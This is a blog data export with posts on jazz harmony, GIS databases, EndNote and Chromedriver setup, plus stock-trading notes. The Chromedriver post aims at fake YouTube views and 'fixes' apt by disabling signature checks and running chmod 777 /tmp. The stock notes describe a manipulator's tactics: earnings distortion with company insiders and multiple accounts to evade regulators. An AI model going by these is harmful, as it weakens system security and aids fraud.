我们要留意每个和弦的七音都向下解决一个小二度, 变为下一个和弦的三音. 这也是基本的voice leading. 声部进行是一个特定的方向的移动. 就好像七音被一种重力或者磁力吸引, 迫使她向下解决一个小二度. 比如我在吹奏的时候,在做即兴演奏, 但是另一个乐手在演奏主旋律, 那么我要奏出一个七音并向下解决一个小二度, 会马上为独奏者勾勒一条背景线条. 和古典音乐一样，爵士乐也强调7th的解决，这是七和弦的自然倾向。在声部进行中应该特别注意。\n\n我们google一下五度圈 然后就能够发现 逆时针进行的五度圈就是无限的II-V-I. 很有意思吧.\n\n#### 笔记一下其他和弦进行\n+ V级的V ：也就是古典中的重属和弦，但是不全解决。如 D7-G7, 但在乐队演奏中, 键盘通常用的无根音和弦, 也就是在乐队中将根音交给bass处理, 就让键盘的低音线条更加流畅. \n+ I-vi-ii-V：最常见的和弦进行，可以配无数首流行歌，不多提了。\n+ iii-vi-ii-V：一级换成了同功能的三级，顺便增加了进行到vi的倾向性，形成了4个连续的属到主进行。\n+ I-ii-iii-IV：多用于长音，如两小节都是I级和弦时，吉他和钢琴进行和声加花（I-ii-iii-IV-iii-ii-I）。\n+ I-IV：常用的一级到四级进行。","source":"_posts/[Jazz]-II-V-I进行.md","raw":"---\nlayout: title\ntitle: 进行II—V-I的笔记\ndate: 2021-01-01 08:49:27\ntags: jazz\ncategories: Music\n---\n\n最近重新捡起我的aerophone了, 在YouTube上找到一个很不错的乐手能够教我们根练 (藤井泰宏). \n\n那么关于II-V-I, 有一个值得注意的是 II是小七和弦(2461) 记做D-7; V是属七和弦 (5724) 记做 (G7) I是大七和弦 (1357) 记Cmaj7, 差不多是在爵士中一个固定的模式, 也就是我们在调性频繁切换的时候, 根据和弦性质来判断级数. \n\n所以当我们在研究II和弦到V和弦再到I级和弦的时候, 我们要留意每个和弦的七音都向下解决一个小二度, 变为下一个和弦的三音. 这也是基本的voice leading. 声部进行是一个特定的方向的移动. 就好像七音被一种重力或者磁力吸引, 迫使她向下解决一个小二度. 比如我在吹奏的时候,在做即兴演奏, 但是另一个乐手在演奏主旋律, 那么我要奏出一个七音并向下解决一个小二度, 会马上为独奏者勾勒一条背景线条. 和古典音乐一样，爵士乐也强调7th的解决，这是七和弦的自然倾向。在声部进行中应该特别注意。\n\n我们google一下五度圈 然后就能够发现 逆时针进行的五度圈就是无限的II-V-I. 很有意思吧.\n\n#### 笔记一下其他和弦进行\n+ V级的V ：也就是古典中的重属和弦，但是不全解决。如 D7-G7, 但在乐队演奏中, 键盘通常用的无根音和弦, 也就是在乐队中将根音交给bass处理, 就让键盘的低音线条更加流畅. \n+ I-vi-ii-V：最常见的和弦进行，可以配无数首流行歌，不多提了。\n+ iii-vi-ii-V：一级换成了同功能的三级，顺便增加了进行到vi的倾向性，形成了4个连续的属到主进行。\n+ I-ii-iii-IV：多用于长音，如两小节都是I级和弦时，吉他和钢琴进行和声加花（I-ii-iii-IV-iii-ii-I）。\n+ I-IV：常用的一级到四级进行。","slug":"[Jazz]-II-V-I进行","published":1,"updated":"2021-01-31T19:27:11.537Z","comments":1,"photos":[],"link":"","_id":"ckkljsas5000lr242q2t69zro","content":"<p>最近重新捡起我的aerophone了, 在YouTube上找到一个很不错的乐手能够教我们根练 (藤井泰宏). </p>\n<p>那么关于II-V-I, 有一个值得注意的是 II是小七和弦(2461) 记做D-7; V是属七和弦 (5724) 记做 (G7) I是大七和弦 (1357) 记Cmaj7, 差不多是在爵士中一个固定的模式, 也就是我们在调性频繁切换的时候, 根据和弦性质来判断级数. </p>\n<p>所以当我们在研究II和弦到V和弦再到I级和弦的时候, 我们要留意每个和弦的七音都向下解决一个小二度, 变为下一个和弦的三音. 这也是基本的voice leading. 声部进行是一个特定的方向的移动. 就好像七音被一种重力或者磁力吸引, 迫使她向下解决一个小二度. 比如我在吹奏的时候,在做即兴演奏, 但是另一个乐手在演奏主旋律, 那么我要奏出一个七音并向下解决一个小二度, 会马上为独奏者勾勒一条背景线条. 和古典音乐一样，爵士乐也强调7th的解决，这是七和弦的自然倾向。在声部进行中应该特别注意。</p>\n<p>我们google一下五度圈 然后就能够发现 逆时针进行的五度圈就是无限的II-V-I. 很有意思吧.</p>\n<h4 id=\"笔记一下其他和弦进行\"><a href=\"#笔记一下其他和弦进行\" class=\"headerlink\" title=\"笔记一下其他和弦进行\"></a>笔记一下其他和弦进行</h4><ul>\n<li>V级的V ：也就是古典中的重属和弦，但是不全解决。如 D7-G7, 但在乐队演奏中, 键盘通常用的无根音和弦, 也就是在乐队中将根音交给bass处理, 就让键盘的低音线条更加流畅. </li>\n<li>I-vi-ii-V：最常见的和弦进行，可以配无数首流行歌，不多提了。</li>\n<li>iii-vi-ii-V：一级换成了同功能的三级，顺便增加了进行到vi的倾向性，形成了4个连续的属到主进行。</li>\n<li>I-ii-iii-IV：多用于长音，如两小节都是I级和弦时，吉他和钢琴进行和声加花（I-ii-iii-IV-iii-ii-I）。</li>\n<li>I-IV：常用的一级到四级进行。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>最近重新捡起我的aerophone了, 在YouTube上找到一个很不错的乐手能够教我们根练 (藤井泰宏). </p>\n<p>那么关于II-V-I, 有一个值得注意的是 II是小七和弦(2461) 记做D-7; V是属七和弦 (5724) 记做 (G7) I是大七和弦 (1357) 记Cmaj7, 差不多是在爵士中一个固定的模式, 也就是我们在调性频繁切换的时候, 根据和弦性质来判断级数. </p>\n<p>所以当我们在研究II和弦到V和弦再到I级和弦的时候, 我们要留意每个和弦的七音都向下解决一个小二度, 变为下一个和弦的三音. 这也是基本的voice leading. 声部进行是一个特定的方向的移动. 就好像七音被一种重力或者磁力吸引, 迫使她向下解决一个小二度. 比如我在吹奏的时候,在做即兴演奏, 但是另一个乐手在演奏主旋律, 那么我要奏出一个七音并向下解决一个小二度, 会马上为独奏者勾勒一条背景线条. 和古典音乐一样，爵士乐也强调7th的解决，这是七和弦的自然倾向。在声部进行中应该特别注意。</p>\n<p>我们google一下五度圈 然后就能够发现 逆时针进行的五度圈就是无限的II-V-I. 很有意思吧.</p>\n<h4 id=\"笔记一下其他和弦进行\"><a href=\"#笔记一下其他和弦进行\" class=\"headerlink\" title=\"笔记一下其他和弦进行\"></a>笔记一下其他和弦进行</h4><ul>\n<li>V级的V ：也就是古典中的重属和弦，但是不全解决。如 D7-G7, 但在乐队演奏中, 键盘通常用的无根音和弦, 也就是在乐队中将根音交给bass处理, 就让键盘的低音线条更加流畅. </li>\n<li>I-vi-ii-V：最常见的和弦进行，可以配无数首流行歌，不多提了。</li>\n<li>iii-vi-ii-V：一级换成了同功能的三级，顺便增加了进行到vi的倾向性，形成了4个连续的属到主进行。</li>\n<li>I-ii-iii-IV：多用于长音，如两小节都是I级和弦时，吉他和钢琴进行和声加花（I-ii-iii-IV-iii-ii-I）。</li>\n<li>I-IV：常用的一级到四级进行。</li>\n</ul>\n"},{"layout":"title","title":"Using Chromedriver in linux","date":"2018-04-21T14:11:06.000Z","_content":"\nA simple motivation for me to use chromedrive on my server. Someone ask me if I could make some fake youtube view on his channel. I said possible, but haven't tried before. \n\nSome blogs said it could use Tor browser to refresh the user trace. But the installation of Tor on linux brings me to hell. I know dark net is cool. But I just cannot figure it out how I can quickly achieve my simple goal.\n\nChromedirve may help me to fake a browser on linux. because I need some long duration view requests on linux.\n\nThen I came across some errors:\n```\n    APT-GET“Couldn’t create temporary file for passing config to apt-key”\n```\nor `cannot install unsigned` stuff ...\n\nUsing `--allow-unauthenticated` to force pass unsigned repo list, I hope it work but it just throw me different warning error. \n\nI'd tried add `[trusted=yes]` in the front of `source.list`. It fixed one of two stage error: bypass the key. But still cannot update apt. \n\nHow about `pacman/pacapt`. This time we cannot use this tool, though it still the top way of managing program in ubuntu. \n\nThen I checked the `/tmp` folder, if there is some error, some lost of premission stuff. To be honest, I have no idea since `/tmp` folder is a important system folder and I'd never ever touched it before. \n\nBut after add `chmod 777 /tmp`. It works out.\n\nWe still can use both add `deb` or just using `apt install` to install `google-chrome-stable`; simple command `sudo apt-get install google-chrome-stable`; if got problem or dependencies problem; use `sudo apt-get install -f` \n\nNotice that `-f` means `--fix-broken` not `--force`; actually you cannot install a program forcely. \n\nNext article I will write a tuturial about youtube view bot; a way to increase youtube fake view. But this way still depends on a nice proxy pool. Free proxy pool may not help. ","source":"_posts/Using-chromedrive-in-linux.md","raw":"---\nlayout: title\ntitle: Using Chromedriver in linux\ndate: 2018-04-21 09:11:06\ntags: Linux\ncategories: Tech\n---\n\nA simple motivation for me to use chromedrive on my server. Someone ask me if I could make some fake youtube view on his channel. I said possible, but haven't tried before. \n\nSome blogs said it could use Tor browser to refresh the user trace. But the installation of Tor on linux brings me to hell. I know dark net is cool. But I just cannot figure it out how I can quickly achieve my simple goal.\n\nChromedirve may help me to fake a browser on linux. because I need some long duration view requests on linux.\n\nThen I came across some errors:\n```\n    APT-GET“Couldn’t create temporary file for passing config to apt-key”\n```\nor `cannot install unsigned` stuff ...\n\nUsing `--allow-unauthenticated` to force pass unsigned repo list, I hope it work but it just throw me different warning error. \n\nI'd tried add `[trusted=yes]` in the front of `source.list`. It fixed one of two stage error: bypass the key. But still cannot update apt. \n\nHow about `pacman/pacapt`. This time we cannot use this tool, though it still the top way of managing program in ubuntu. \n\nThen I checked the `/tmp` folder, if there is some error, some lost of premission stuff. To be honest, I have no idea since `/tmp` folder is a important system folder and I'd never ever touched it before. \n\nBut after add `chmod 777 /tmp`. It works out.\n\nWe still can use both add `deb` or just using `apt install` to install `google-chrome-stable`; simple command `sudo apt-get install google-chrome-stable`; if got problem or dependencies problem; use `sudo apt-get install -f` \n\nNotice that `-f` means `--fix-broken` not `--force`; actually you cannot install a program forcely. \n\nNext article I will write a tuturial about youtube view bot; a way to increase youtube fake view. But this way still depends on a nice proxy pool. Free proxy pool may not help. ","slug":"Using-chromedrive-in-linux","published":1,"updated":"2019-02-21T14:21:17.280Z","comments":1,"photos":[],"link":"","_id":"ckkljsas6000or242dm0eldr6","content":"<p>A simple motivation for me to use chromedrive on my server. Someone ask me if I could make some fake youtube view on his channel. I said possible, but haven’t tried before. </p>\n<p>Some blogs said it could use Tor browser to refresh the user trace. But the installation of Tor on linux brings me to hell. I know dark net is cool. But I just cannot figure it out how I can quickly achieve my simple goal.</p>\n<p>Chromedirve may help me to fake a browser on linux. because I need some long duration view requests on linux.</p>\n<p>Then I came across some errors:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APT-GET“Couldn’t create temporary file for passing config to apt-key”</span><br></pre></td></tr></table></figure></p>\n<p>or <code>cannot install unsigned</code> stuff …</p>\n<p>Using <code>--allow-unauthenticated</code> to force pass unsigned repo list, I hope it work but it just throw me different warning error. </p>\n<p>I’d tried add <code>[trusted=yes]</code> in the front of <code>source.list</code>. It fixed one of two stage error: bypass the key. But still cannot update apt. </p>\n<p>How about <code>pacman/pacapt</code>. This time we cannot use this tool, though it still the top way of managing program in ubuntu. </p>\n<p>Then I checked the <code>/tmp</code> folder, if there is some error, some lost of premission stuff. To be honest, I have no idea since <code>/tmp</code> folder is a important system folder and I’d never ever touched it before. </p>\n<p>But after add <code>chmod 777 /tmp</code>. It works out.</p>\n<p>We still can use both add <code>deb</code> or just using <code>apt install</code> to install <code>google-chrome-stable</code>; simple command <code>sudo apt-get install google-chrome-stable</code>; if got problem or dependencies problem; use <code>sudo apt-get install -f</code> </p>\n<p>Notice that <code>-f</code> means <code>--fix-broken</code> not <code>--force</code>; actually you cannot install a program forcely. </p>\n<p>Next article I will write a tuturial about youtube view bot; a way to increase youtube fake view. But this way still depends on a nice proxy pool. Free proxy pool may not help. </p>\n","site":{"data":{}},"excerpt":"","more":"<p>A simple motivation for me to use chromedrive on my server. Someone ask me if I could make some fake youtube view on his channel. I said possible, but haven’t tried before. </p>\n<p>Some blogs said it could use Tor browser to refresh the user trace. But the installation of Tor on linux brings me to hell. I know dark net is cool. But I just cannot figure it out how I can quickly achieve my simple goal.</p>\n<p>Chromedirve may help me to fake a browser on linux. because I need some long duration view requests on linux.</p>\n<p>Then I came across some errors:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APT-GET“Couldn’t create temporary file for passing config to apt-key”</span><br></pre></td></tr></table></figure></p>\n<p>or <code>cannot install unsigned</code> stuff …</p>\n<p>Using <code>--allow-unauthenticated</code> to force pass unsigned repo list, I hope it work but it just throw me different warning error. </p>\n<p>I’d tried add <code>[trusted=yes]</code> in the front of <code>source.list</code>. It fixed one of two stage error: bypass the key. But still cannot update apt. </p>\n<p>How about <code>pacman/pacapt</code>. This time we cannot use this tool, though it still the top way of managing program in ubuntu. </p>\n<p>Then I checked the <code>/tmp</code> folder, if there is some error, some lost of premission stuff. To be honest, I have no idea since <code>/tmp</code> folder is a important system folder and I’d never ever touched it before. </p>\n<p>But after add <code>chmod 777 /tmp</code>. It works out.</p>\n<p>We still can use both add <code>deb</code> or just using <code>apt install</code> to install <code>google-chrome-stable</code>; simple command <code>sudo apt-get install google-chrome-stable</code>; if got problem or dependencies problem; use <code>sudo apt-get install -f</code> </p>\n<p>Notice that <code>-f</code> means <code>--fix-broken</code> not <code>--force</code>; actually you cannot install a program forcely. </p>\n<p>Next article I will write a tuturial about youtube view bot; a way to increase youtube fake view. But this way still depends on a nice proxy pool. Free proxy pool may not help. </p>\n"},{"layout":"title","title":"MongoDB vs PostgreSQL in GIS","date":"2017-09-11T14:11:06.000Z","_content":"\n开源的空间数据库比较少见，最近一个小项目需要用到，所以特地还对比了一番。\n\nPostgreSQL 能够使用PostGIS的全套功能，当然这并不是一个优势。但是可以做一些有用的东西，比如你可以查找在地图上的某一个半径内的兴趣点。就可以用earth distance的模块和gist索引。\n\nMongodb的话就可以使用geoNear的方法，同时搭配的就是2d空间索引。其实大同小异。\n\nPostgreSQL的查询很快速而且很灵活，可以很好的扩展。在MongoDB上会麻烦一些。\n\n在考虑这两者的时候，也需要考虑很多如：\n\n在SQL方面支持更好的是\n\n数据是否是结构化的，是否会有一些半结构化的存在。\n\n是否需要ACID的保证。\n\n是否需要查询多表\n\n在MongoDB支持更好的是\n\n是否需要高强度的扩容。\n\njs 或者 JSON的编程方式\n","source":"_posts/[GIS]MongoDB vs PostgreSQL in GIS.md","raw":"---\nlayout: title\ntitle: MongoDB vs PostgreSQL in GIS\ndate: 2017-09-11 09:11:06\ntags: database\ncategories: GIS\n---\n\n开源的空间数据库比较少见，最近一个小项目需要用到，所以特地还对比了一番。\n\nPostgreSQL 能够使用PostGIS的全套功能，当然这并不是一个优势。但是可以做一些有用的东西，比如你可以查找在地图上的某一个半径内的兴趣点。就可以用earth distance的模块和gist索引。\n\nMongodb的话就可以使用geoNear的方法，同时搭配的就是2d空间索引。其实大同小异。\n\nPostgreSQL的查询很快速而且很灵活，可以很好的扩展。在MongoDB上会麻烦一些。\n\n在考虑这两者的时候，也需要考虑很多如：\n\n在SQL方面支持更好的是\n\n数据是否是结构化的，是否会有一些半结构化的存在。\n\n是否需要ACID的保证。\n\n是否需要查询多表\n\n在MongoDB支持更好的是\n\n是否需要高强度的扩容。\n\njs 或者 JSON的编程方式\n","slug":"[GIS]MongoDB vs PostgreSQL in GIS","published":1,"updated":"2019-08-19T16:27:41.633Z","comments":1,"photos":[],"link":"","_id":"ckkljsas8000sr242v7nmfur7","content":"<p>开源的空间数据库比较少见，最近一个小项目需要用到，所以特地还对比了一番。</p>\n<p>PostgreSQL 能够使用PostGIS的全套功能，当然这并不是一个优势。但是可以做一些有用的东西，比如你可以查找在地图上的某一个半径内的兴趣点。就可以用earth distance的模块和gist索引。</p>\n<p>Mongodb的话就可以使用geoNear的方法，同时搭配的就是2d空间索引。其实大同小异。</p>\n<p>PostgreSQL的查询很快速而且很灵活，可以很好的扩展。在MongoDB上会麻烦一些。</p>\n<p>在考虑这两者的时候，也需要考虑很多如：</p>\n<p>在SQL方面支持更好的是</p>\n<p>数据是否是结构化的，是否会有一些半结构化的存在。</p>\n<p>是否需要ACID的保证。</p>\n<p>是否需要查询多表</p>\n<p>在MongoDB支持更好的是</p>\n<p>是否需要高强度的扩容。</p>\n<p>js 或者 JSON的编程方式</p>\n","site":{"data":{}},"excerpt":"","more":"<p>开源的空间数据库比较少见，最近一个小项目需要用到，所以特地还对比了一番。</p>\n<p>PostgreSQL 能够使用PostGIS的全套功能，当然这并不是一个优势。但是可以做一些有用的东西，比如你可以查找在地图上的某一个半径内的兴趣点。就可以用earth distance的模块和gist索引。</p>\n<p>Mongodb的话就可以使用geoNear的方法，同时搭配的就是2d空间索引。其实大同小异。</p>\n<p>PostgreSQL的查询很快速而且很灵活，可以很好的扩展。在MongoDB上会麻烦一些。</p>\n<p>在考虑这两者的时候，也需要考虑很多如：</p>\n<p>在SQL方面支持更好的是</p>\n<p>数据是否是结构化的，是否会有一些半结构化的存在。</p>\n<p>是否需要ACID的保证。</p>\n<p>是否需要查询多表</p>\n<p>在MongoDB支持更好的是</p>\n<p>是否需要高强度的扩容。</p>\n<p>js 或者 JSON的编程方式</p>\n"},{"layout":"title","title":"EndNote Debug","date":"2020-01-26T15:11:06.000Z","_content":"\nEndNote is a nice tool for reference manage. Here is some problem when I getting in to this new area. Some troubleshooting comes subsequently. \n\n1. `COM Cannot Edit Range X9`\n\nIt looks like the EndNote and conflict with Zotero and Mendeley Plugin. Just uninstall all Plugin in the start folder which located at: \n\n```\n~/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word (i.e., the Library folder within your home directory). \n\nThe ~/Library folder is hidden by default, but you can open it from the Finder by holding down Option, clicking the Go menu, and selecting Library. You can also press Cmd-Shift-G in Finder and copy in the default location to navigate to that folder.\n\n```\nWord for 2016 and 2019 only.\n","source":"_posts/[Research]-endnote-debug.md","raw":"---\nlayout: title\ntitle: EndNote Debug\ndate: 2020-01-26 09:11:06\ntags: research  \ncategories: debug\n---\n\nEndNote is a nice tool for reference manage. Here is some problem when I getting in to this new area. Some troubleshooting comes subsequently. \n\n1. `COM Cannot Edit Range X9`\n\nIt looks like the EndNote and conflict with Zotero and Mendeley Plugin. Just uninstall all Plugin in the start folder which located at: \n\n```\n~/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word (i.e., the Library folder within your home directory). \n\nThe ~/Library folder is hidden by default, but you can open it from the Finder by holding down Option, clicking the Go menu, and selecting Library. You can also press Cmd-Shift-G in Finder and copy in the default location to navigate to that folder.\n\n```\nWord for 2016 and 2019 only.\n","slug":"[Research]-endnote-debug","published":1,"updated":"2020-01-26T21:58:23.418Z","comments":1,"photos":[],"link":"","_id":"ckkljsas9000wr242bk7wdbfv","content":"<p>EndNote is a nice tool for reference manage. Here is some problem when I getting in to this new area. Some troubleshooting comes subsequently. </p>\n<ol>\n<li><code>COM Cannot Edit Range X9</code></li>\n</ol>\n<p>It looks like the EndNote and conflict with Zotero and Mendeley Plugin. Just uninstall all Plugin in the start folder which located at: </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word (i.e., the Library folder within your home directory). </span><br><span class=\"line\"></span><br><span class=\"line\">The ~/Library folder is hidden by default, but you can open it from the Finder by holding down Option, clicking the Go menu, and selecting Library. You can also press Cmd-Shift-G in Finder and copy in the default location to navigate to that folder.</span><br></pre></td></tr></table></figure>\n<p>Word for 2016 and 2019 only.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>EndNote is a nice tool for reference manage. Here is some problem when I getting in to this new area. Some troubleshooting comes subsequently. </p>\n<ol>\n<li><code>COM Cannot Edit Range X9</code></li>\n</ol>\n<p>It looks like the EndNote and conflict with Zotero and Mendeley Plugin. Just uninstall all Plugin in the start folder which located at: </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Library/Group Containers/UBF8T346G9.Office/User Content/Startup/Word (i.e., the Library folder within your home directory). </span><br><span class=\"line\"></span><br><span class=\"line\">The ~/Library folder is hidden by default, but you can open it from the Finder by holding down Option, clicking the Go menu, and selecting Library. You can also press Cmd-Shift-G in Finder and copy in the default location to navigate to that folder.</span><br></pre></td></tr></table></figure>\n<p>Word for 2016 and 2019 only.</p>\n"},{"layout":"title","title":"游资 买入 卖出-主要是想体验一下交易","date":"2017-05-11T14:11:06.000Z","_content":"\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n## 入场和出场\n\n假如我是一个庄家，我会怎么做？\n\n股票市场的定律是一赢两平七亏，意思是70%以上的人都会亏损。那散户如何才能站到赢利的10%人的群体中？我认为，机构为了赚散户钱，不断的在研究散户心理和行为学，我们散户不妨反过来，把自己当成机构投资者，也来研究一下机构的心理和行为学，这样才能在这个充满陷阱、欺诈、骗术和谣言四起的市场里立于不败之地。\n\n如果我是机构投资者，要想做一支股票，我认为我先要找到一支大小合适，前景无需多么优秀，但几年之内绝对不会倒闭的那一种。然后我去拜会该公司领导，告诉他我想投资他那支股票，请他们配合。如何配合呢？就是在我吸筹时，在公报时尽量将业绩放平，或者适当隐藏利润，这一点公司很容易做到，只要对报表进行适当调整就行了，例如，将某些损益一个季度提完，使其报表看上去亏损；或者将后面数年的费用半年摊完，这都使得当期报表非常难看。\n\n在这之前，我肯定是要进一些筹码的，这些筹码主要用来砸盘的。怎么收集这些砸盘的筹码？我不会每天慢慢去收集，因为这样会使股票天天上涨，反而难以收到足够的筹码，还容易被散户抢酬，并使技术指标形成向上趋势，更使自己收集成本提高。我会在某一天用大涨的办法来收集，当连跌数天后，散户都悲观失望，猛然一个大涨，套牢的看到了希望，不会抛出；而短线获利的，可能就交枪了，其实，在这个价位我只是要砸盘的筹码，不需要收集很多，因此用猛然大涨的办法就很容易达到目的（见底前平台，成交量会放大）。\n\n第二天来个低开。为什么要低开而不高开，因为我昨天收集的筹码并不准备获利，而且要让昨天追风进去的短线筹码帮我砸盘，如果高开，很容易让短线筹码获利，他们就会在下跌途中有更多的资金来跟我抢酬，所以一定要低开，消耗这些短线资金（盈利的短线盘很关注这只股，而亏损的短线盘则极少再次关注它）。\n\n在这个下跌途中，我将逐步用单托底，因为我要形成自己的底仓（难道这不会造成成交量的放大，而非极度缩量？）。经过几天的连续下跌，有些割肉的筹码就会回补自己的仓位，这时候我不能让他们回补，我必须迅速的吃上去让他们追风（直线拔升方式常见的原因），当形成追风盘时，我将在底部的部分筹码高抛，一是为了降低成本，二是腾出资金，然后再迅速的砸下去。同样的，我会边托边砸，这样一来我就会得到更多价格更低的筹码。\n\n当跌到很低位时，基本上就没人和我抢筹码了，因为在这个下跌途中，我通过不断的高抛低吸，不断的大幅度振荡，将大部分抄底的，抢反弹的都套在下跌途中，或者将他们亏损怠尽，使其不敢再来涉足这个股票，这时候我的目的就达到了（把买盘都赶出去）。而公司的配合在这时就非常关键，长时间的业绩没有任何起色，使大部分散户因怀疑其会不会ST，因而恐惧惊慌，高位筹码就会不断的掉落，我就可以在底部横盘当中不断的高抛低吸来收集筹码，这个可能需要较长时间，关键看顶部筹码掉落程度而定，如果高位筹码长时间的不松动，那我就不会去拉这只股票。（筹码流动）\n\n当筹码收集足够多时，公司的业绩也会转好了，因为在我收集筹码当中，公司将后面几年能想的出来的损益，或者费用都在那一年半载中摊完了，后面的报表当然好看。这时候我拉起来毫不费力，也无需多大成本。当这个市场里其他人看到这个股原来这么优秀，必然跟风者众，我就在这这当中逐步减仓。（（1）筹码结构（资金结构）（2）技术指标（3）业绩预期）\n\n公司能如此配合，那他能得到什么好处？其实很简单，我将股票拉到高位，他们也能卖个好价钱；在低位时，他们同样可以购入自己的股票，还能挣得名声，这样一来收益会相当可观，何乐而不为？\n\n这当然要和大盘走势相同，在这中间，散户该知道怎么办了吧。\n\n当然，如果我做庄，还必需考虑很多问题：第一是证监会的监控，他们虽然老虎不敢碰，或者就是为虎作猖，但捏死个把苍蝇还是不成问题的，所以，操控股票不能让他们抓住把柄，这时候就要考虑多户头，或者拉几个私募大户集体作战。\n\n第二要考虑产业资本的问题，如果我们拉的时候，他们看到利润可观，结果大量抛出筹码，那我们就惨了，必然会亏本出局，在做之前就必需先和他们沟通好，而且还要了解他们手上的流通盘是多少，抛售意向如何，这就是大小非问题。\n\n第三个要考虑的是老庄，如果这个股没有被老庄放弃，那我是尽量不会去碰的，因为一但被老庄反做，那你死得就惨了，就像中国联通套游资一样，那死得是非常惨的，所以，选股非常重要。\n\n第四个就是大盘状况，跟风的多不多，社会上的存量资金足不足，就像现在这样，大部分散户或者大户都被大宰一刀，这时候就不适宜做股票，你拉人家卖，结果把自己套在里面。那现在最适宜的就是砸股票。一般人都有个心态，20元买的股，跌到15元不卖，跌到10元不卖，跌到5元仍然没多少会人卖，但是你要跌到2元再拉回4元，不少人一看翻倍基本上都会割肉的，特别是长时间的向下或者横盘（当然，翻一倍后作中期调整的概率可能性，在操作系统上可认为是100%）。\n\n如果这些问题都解决了，砸盘就要开始。砸多少为适宜？根据大盘状况，每天操盘必需跟着大盘走，当大盘大跌时，你必需深砸下去，这时候成本很低，只要用少量筹码将关键点位砸开即可，会有止损盘帮你接着砸下去。但是尾盘必需进一些筹码，防止第二天大盘走低或者走高，有一定量筹码就好灵活掌握，也就是说，要在操盘时盯着指标股（借势才是合格的操盘手）。\n\n为什么要盯着指标股去做？关键就在于成本，随着大盘波动，你的成本最低，指标股跌时，你也跌，所用砸盘筹码量最少，因为没有多少人敢买，可以深砸（并不是什么时候都可以深砸高拉的）。当大盘涨时你去拉，同样无须买多少，只要将关键点位的筹码买掉即可，有人会将股价推上去，到一定高点，你还可以将低位进的筹码出掉一些，这样可以腾出一点资金做一点差价。所以，我们看到的股市局面就是要涨一起涨，要跌大家都去跌。\n\n在股市中的人分好几种，趋势投资者，套牢后不理不睬者，技术派，基本面派，长线客，短线炒家等等。\n\n我要在这个股票里做庄，这些人我都要面对，尽量的让他们在我控制的这个股票里少赚或者割肉而去，这时候我就要用很多办法来对付，因为他们赚多了，意味着我就赚少了，他们不割肉，我就赚不到钱（针对某一只股票，主力要面对的是阶段性对手盘，同样阶段性对手盘也面对着阶段性对手盘）。\n\n对趋势投资者，我没什么好办法，只能将他们看做锁仓的一员；但对其他人，我平时的吃喝玩乐就全靠他们了。我一般最喜欢套牢后不理不睬的，这些人把钱交给我后帮我锁定了大部分筹码，使我在底位有充足的资金纵横驰骋（？待定，低位时主力要高抛低吸短差收股票，但因持仓量少对盘面的控制力差，所以非常需要锁仓套牢盘，套牢盘的不动，造就了主力（新资金）的异动（才能让交易者看出来））。\n\n基本面派也是我喜欢的第二位，因为当我将股价拉高后他们基本就接手了，企业的基本面在我拉高股价后变得非常亮丽，他们就会来接盘；等他们接完后公司基本面就发生改变，他们在低位就将筹码再还给我。\n\n技术派一般短线较多，喜欢做波段，这里的人有自认为技术高明的，什么KDJ金叉、死叉，什么MACD、CR、量价关系，什么费波纳奇黄金分割位，什么艾略特的波浪理论，还有江恩曲线等等，等等，但我做股票一般不看这个，我一般只盯着今天我下多少单，在某些价位进来多少单，大一些的户头在什么价位进出。这个对我来说非常关键，因为这决定了第二天该如何操作，有时候需要对他们安抚，让他们帮忙将股票在手上多留几天，以使活动筹码减少。但有时候就必须让他们出局，特别是短线客，当今天发现短线游资进来多了，第二天不管怎样都要将他们杀出局，哪怕逆大盘而动（不杀不行啊，不杀盘面就会失控，破坏坐庄计划）。回过头来看，呵呵，真搞笑，K线走的还真符合某些技术指标特点。偶然乎，必然乎（有意思，偶然中的必然）。\n\n这里解释一下我为什么要猛杀游资。\n\n其实这关乎自己的短期收益，因为短线客和游资的钱最好赚，他们持筹码的时间短，可以使我非常短的时间里获利。例如套牢盘，你只能一次性的赚他一下，他然后就不动了，你就拿他一点办法都没有，这中间有时候长达几年，在这几年里我可是要吃要喝的；基本面派也使我获利不多，因为他们的利润我还要和公司均分。\n\n但短线客和游资就不同了，我在一个波段中就可以获利丰厚。那怎么做呢?\n\n第一是逐步拉升，这时候技术指标就开始走好，技术派的人一看技术指标，一般都容易被诱惑进来，这中间我就边拉边卖，需要控制的就是在顶背离之前（背驰段之中）将筹码交他们手中，使他们看上去技术指标仍然没有到顶，股价还可以涨得更高，这时候第二天来个冲高回落，然后第三天猛然下跌，他们基本上就开始交枪了（这个动作很常见），不用我来，股价就下去了，这中间自然我设定好价位来捡果实。\n\n对游资更是这样，上半段我来拉，游资一看股价看涨，立即蜂拥而来，那下半段我就将部分筹码交给他们，第二天我来个低开低走，游资一看势头不对，立即出逃，这时候我就要看出逃数量，并计算自己的成果，如果出逃数量足够多，那我下午就拉起，因为大部分短线客都走了，我就不需要支付多少利润出去，很容易将股价拉起来，而我在这两天来回的差价最少是赚交易额的3%左右。\n\n但发现没有走多少时那我就继续向下做。这就是不少散户疑问的，为什么我一卖就涨，一买就跌啊?因为你跟大部分人的行为是一致的。（能坐庄的都能打单，对筹码结构很清楚，主力当然根据短线客中大部分人的行为行动）呵呵。\n\n二、坐庄的风险是什么？\n\n1）监管风险：一是操作这只股票的不会是我一个庄，一般都是邀请几个人来联手，就像大草原上的猎狗一样，采用群体战术才能更容易获得成功。要是一个人，第一不一定有这个实力，第二就是太容易被人抓住把柄，搞不好打不到狐狸还惹一身骚，所以，邀请朋友来合作是肯定的，就谁主谁次的问题了。既然是合作，风险也是明显的，当市场出现波动时，其中一个朋友立马放水，这时候你就栽了，很长时间的辛苦都会打水漂。\